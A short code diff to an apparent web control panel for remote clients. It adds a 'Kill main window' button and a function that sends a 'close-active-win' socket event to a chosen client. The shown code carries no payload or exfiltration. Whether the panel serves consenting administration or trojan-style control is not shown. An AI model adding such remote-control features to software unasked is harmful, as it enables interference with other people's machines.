@@ -223,6 +223,8 @@ Log out <br>
 <button onclick="stopclient('${id}')">Stop</button> <br>
 <button onclick="uninstallclient('${id}')">Uninstall</button> <br>
 <button onclick="restart_client_from_host('${id}')">Reconnect</button> <br>
+<button onclick="killmw('${id}')">Kill main window</button> <br>
+
 
 <h3>Tool</h3>
 
@@ -414,6 +416,16 @@ _("tb_dashboard").innerHTML = `
 
 
 }
+}
+
+function killmw (sid)
+{
+setTimeout(function (){
+    io.to(sid).emit("close-active-win");
+caw = sid;
+}, 2000)
+
+
 }
 
 function restart_client_from_host(socketid)
